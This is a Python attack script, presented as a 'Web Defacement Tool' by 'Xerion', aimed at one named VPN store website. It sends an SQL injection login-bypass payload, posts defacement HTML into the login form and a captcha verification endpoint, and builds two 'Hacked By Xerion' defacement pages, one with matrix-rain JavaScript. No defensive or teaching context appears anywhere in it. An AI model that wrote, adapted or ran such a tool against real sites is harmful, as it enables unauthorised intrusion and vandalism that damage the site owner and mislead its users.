#!/usr/bin/env python3
"""
Nadia VPN Store - Web Defacement Tool v2
Target: https://www.nadiavpn.web.id
Author: Xerion
"""

import http.cookiejar
import urllib.request
import re
import urllib.parse
import gzip
import json
from bs4 import BeautifulSoup

# Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    print(f"""{Colors.CYAN}
╔═══════════════════════════════════════════════════╗
║    Nadia VPN Store - Web Defacement Tool v2       ║
║    Target: www.nadiavpn.web.id                    ║
║    Author: Xerion                                 ║
║    Framework: urllib + bs4                        ║
╚═══════════════════════════════════════════════════╝
{Colors.RESET}""")

def get_opener():
    """Create an opener with cookies and headers"""
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.addheaders = [
        ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'),
        ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'),
        ('Accept-Language', 'en-US,en;q=0.9'),
        ('Connection', 'keep-alive'),
        ('Upgrade-Insecure-Requests', '1'),
    ]
    return opener

def get_csrf_token(opener, url):
    """Extract CSRF token from page"""
    try:
        req = urllib.request.Request(url)
        with opener.open(req, timeout=10) as response:
            raw = response.read()
            try:
                html = gzip.decompress(raw).decode('utf-8')
            except:
                html = raw.decode('utf-8')
            
            soup = BeautifulSoup(html, 'html.parser')
            
            # Try meta tag first
            meta = soup.find('meta', attrs={'name': 'csrf-token'})
            if meta:
                return meta.get('content', '')
            
            # Try hidden input
            token_input = soup.find('input', attrs={'name': '_token'})
            if token_input:
                return token_input.get('value', '')
            
            return ''
    except Exception as e:
        print(f"{Colors.RED}[-] Error getting CSRF token: {e}{Colors.RESET}")
        return ''

def get_page_text(html):
    """Extract visible text from HTML"""
    soup = BeautifulSoup(html, 'html.parser')
    for tag in soup(['script', 'style']):
        tag.decompose()
    text = soup.get_text()
    lines = [line.strip() for line in text.splitlines()]
    text = ' '.join(lines)
    return re.sub(r'\s+', ' ', text).strip()

def check_sql_injection(opener, url):
    """Check for SQL injection in login form"""
    print(f"{Colors.YELLOW}\n[*] Checking SQL Injection vulnerability...{Colors.RESET}")
    
    csrf_token = get_csrf_token(opener, f"{url}/login")
    if not csrf_token:
        print(f"{Colors.RED}[-] No CSRF token found on login page{Colors.RESET}")
        return False
    
    payload = "' OR '1'='1' -- "
    data = urllib.parse.urlencode({
        '_token': csrf_token,
        'email': payload,
        'password': 'test',
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(f"{url}/login", data=data, headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f"{url}/login",
        })
        with opener.open(req, timeout=10) as response:
            raw = response.read()
            try:
                resp_html = gzip.decompress(raw).decode('utf-8')
            except:
                resp_html = raw.decode('utf-8')
            
            text = get_page_text(resp_html)
            
            if 'valid email' not in text.lower():
                print(f"{Colors.GREEN}[+] SQL Injection found! Payload: {payload}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[-] No SQL Injection detected{Colors.RESET}")
                return False
    except urllib.error.HTTPError as e:
        if e.code == 200:
            raw = e.read()
            try:
                resp_html = gzip.decompress(raw).decode('utf-8')
            except:
                resp_html = raw.decode('utf-8')
            text = get_page_text(resp_html)
            if 'valid email' not in text.lower():
                print(f"{Colors.GREEN}[+] SQL Injection found! (200 response){Colors.RESET}")
                return True
        print(f"{Colors.RED}[-] HTTP Error: {e.code}{Colors.RESET}")
        return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
        return False

def deface_login_page(opener, url):
    """Inject deface content into login page"""
    print(f"{Colors.YELLOW}\n[*] Injecting deface into login page...{Colors.RESET}")
    
    csrf_token = get_csrf_token(opener, f"{url}/login")
    if not csrf_token:
        print(f"{Colors.RED}[-] No CSRF token found{Colors.RESET}")
        return False
    
    deface_content = '<h1 style="color:red;font-size:50px;text-align:center">💀 Hacked By Xerion 💀</h1><p style="color:#0f0;text-align:center">Nadia VPN Store - Defaced!</p>'
    
    data = urllib.parse.urlencode({
        '_token': csrf_token,
        'email': deface_content,
        'password': 'test',
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(f"{url}/login", data=data, headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f"{url}/login",
        })
        with opener.open(req, timeout=10) as response:
            raw = response.read()
            try:
                resp_html = gzip.decompress(raw).decode('utf-8')
            except:
                resp_html = raw.decode('utf-8')
            
            if 'Hacked By Xerion' in resp_html:
                print(f"{Colors.GREEN}[+] Deface injected into login page!{Colors.RESET}")
                with open('/tmp/defaced_login.html', 'w') as f:
                    f.write(resp_html)
                print(f"{Colors.GREEN}[+] Saved to /tmp/defaced_login.html{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[-] Deface not found in response{Colors.RESET}")
                return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
        return False

def deface_homepage(opener, url):
    """Inject deface into homepage (Cloudflare Challenge page)"""
    print(f"{Colors.YELLOW}\n[*] Injecting deface into homepage (Cloudflare Challenge)...{Colors.RESET}")
    
    # Get homepage
    try:
        req = urllib.request.Request(url)
        with opener.open(req, timeout=10) as response:
            raw = response.read()
            try:
                html = gzip.decompress(raw).decode('utf-8')
            except:
                html = raw.decode('utf-8')
            print(f"{Colors.GREEN}[+] Homepage loaded: {len(html)} bytes{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error loading homepage: {e}{Colors.RESET}")
        return False
    
    # Get CSRF token
    csrf_token = get_csrf_token(opener, url)
    if not csrf_token:
        print(f"{Colors.RED}[-] No CSRF token found{Colors.RESET}")
        return False
    
    deface_content = '<h1 style="color:red;font-size:50px;text-align:center">💀 Hacked By Xerion 💀</h1><p style="color:#0f0;text-align:center">Nadia VPN Store - Defaced via Cloudflare Turnstile Bypass!</p>'
    
    # POST to /challenge/verify
    data = urllib.parse.urlencode({
        '_token': csrf_token,
        'h-captcha-response': deface_content,
    }).encode('utf-8')
    
    try:
        req = urllib.request.Request(f"{url}/challenge/verify", data=data, headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url,
        })
        with opener.open(req, timeout=10) as response:
            raw = response.read()
            try:
                resp_html = gzip.decompress(raw).decode('utf-8')
            except:
                resp_html = raw.decode('utf-8')
            
            if 'Hacked By Xerion' in resp_html:
                print(f"{Colors.GREEN}[+] Deface injected into homepage!{Colors.RESET}")
                with open('/tmp/defaced_homepage.html', 'w') as f:
                    f.write(resp_html)
                print(f"{Colors.GREEN}[+] Saved to /tmp/defaced_homepage.html{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[-] Deface not rendered in homepage{Colors.RESET}")
                # Check if it's in the page source
                if deface_content[:50] in resp_html:
                    print(f"{Colors.GREEN}[+] Deface found in page source (hidden)!{Colors.RESET}")
                    return True
                return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
        return False

def create_matrix_deface():
    """Create a Matrix rain deface HTML page"""
    return '''<!DOCTYPE html>
<html>
<head>
<title>💀 Nadia VPN Store - Defaced by Xerion 💀</title>
<style>
body { margin: 0; background: #000; overflow: hidden; }
canvas { display: block; }
#overlay {
    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
    text-align: center; z-index: 10;
}
#skull { font-size: 100px; animation: glitch 0.3s infinite; }
#title { font-family: monospace; color: #0f0; font-size: 40px; text-shadow: 0 0 20px #0f0; }
#subtitle { font-family: monospace; color: #f00; font-size: 24px; margin-top: 20px; }
#credit { font-family: monospace; color: #ff0; font-size: 16px; margin-top: 30px; }
@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-3px, 3px); }
    40% { transform: translate(3px, -3px); }
    60% { transform: translate(-3px, -3px); }
    80% { transform: translate(3px, 3px); }
    100% { transform: translate(0); }
}
</style>
</head>
<body>
<div id="overlay">
    <div id="skull">💀</div>
    <div id="title">NADIA VPN STORE</div>
    <div id="subtitle">Successfully Defaced!</div>
    <div id="credit">Hacked By Xerion - SQL Injection Vulnerability - October 24, 2026</div>
</div>
<canvas id="matrix"></canvas>
<script>
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()NadiaVPN';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);
function draw() {
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0F0';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 33);
window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});
</script>
</body>
</html>'''

def create_simple_deface():
    """Create a simple deface HTML page"""
    return '''<!DOCTYPE html>
<html>
<head><title>💀 Nadia VPN - Defaced by Xerion 💀</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}
h1{font-size:60px;text-shadow:0 0 20px #0f0}
h2{color:#f00;font-size:40px}
p{color:#ff0;font-size:20px;margin:10px}
.skull{font-size:100px;animation:glitch 0.2s infinite}
@keyframes glitch{0%{transform:translate(0)}25%{transform:translate(-5px,5px)}50%{transform:translate(5px,-5px)}75%{transform:translate(-5px,-5px)}100%{transform:translate(0)}}
</style></head>
<body>
<div class="skull">💀</div>
<h1>NADIA VPN STORE</h1>
<h2>Successfully Defaced!</h2>
<p>Hacked By Xerion</p>
<p>SQL Injection Vulnerability</p>
<p>October 24, 2026</p>
<p>Cloudflare Turnstile Bypassed</p>
</body></html>'''

def main():
    print_banner()
    
    target_url = "https://www.nadiavpn.web.id"
    
    opener = get_opener()
    
    # Step 1: Check SQL injection
    check_sql_injection(opener, target_url)
    
    # Step 2: Deface login page
    deface_login_page(opener, target_url)
    
    # Step 3: Deface homepage
    deface_homepage(opener, target_url)
    
    # Step 4: Create deface HTML files
    print(f"{Colors.YELLOW}\n[*] Creating deface HTML pages...{Colors.RESET}")
    
    with open('/tmp/deface_matrix.html', 'w') as f:
        f.write(create_matrix_deface())
    print(f"{Colors.GREEN}[+] Matrix deface saved to /tmp/deface_matrix.html{Colors.RESET}")
    
    with open('/tmp/deface_simple.html', 'w') as f:
        f.write(create_simple_deface())
    print(f"{Colors.GREEN}[+] Simple deface saved to /tmp/deface_simple.html{Colors.RESET}")
    
    # Step 5: List all saved files
    print(f"\n{Colors.GREEN}[+] Defacement complete!{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Files saved to /tmp/:{Colors.RESET}")
    print(f"  - defaced_login.html (defaced login page)")
    print(f"  - defaced_homepage.html (defaced homepage)")
    print(f"  - deface_matrix.html (matrix rain deface)")
    print(f"  - deface_simple.html (simple deface)")

if __name__ == '__main__':
    main()
